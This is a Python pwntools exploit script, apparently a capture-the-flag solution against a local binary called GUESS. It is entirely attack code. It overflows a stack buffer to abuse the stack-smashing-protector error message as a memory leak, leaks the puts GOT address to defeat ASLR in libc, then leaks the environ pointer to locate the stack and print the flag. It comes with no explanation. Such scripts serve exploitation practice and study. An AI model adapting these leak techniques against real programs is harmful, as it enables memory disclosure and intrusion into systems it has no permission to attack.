from pwn import *
io = process("./GUESS")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./GUESS")
#context.log_level = 'debug'
#gdb.attach(io,"b *0x0000000000400B1E\nb *0x0000000000400B28")
char_num = 0x7ffc9c975ff8 - 0x7ffc9c975ed0
stack_ = 0x7ffcd1875998 - 0x7ffcd1875830
io.sendlineafter("flag\n","a"*char_num + p64(elf.got["puts"]))
info = io.recvuntil("***: ")
puts_addr = u64(io.recvuntil(" terminated").split(" terminated")[0].ljust(8,"\x00"))
libc_base = puts_addr - libc.symbols["puts"]
libc.address = libc_base
log.info("libc_base:"+hex(libc_base))
environ = libc.symbols['environ']
io.sendlineafter("flag\n","a"*char_num + p64(environ))
info = io.recvuntil("***: ")
stack = u64(io.recvuntil(" terminated").split(" terminated")[0].ljust(8,"\x00"))
log.info("stack:"+hex(stack))
io.sendlineafter("flag\n","a"*0x128 + p64(stack-stack_))
print io.recv()
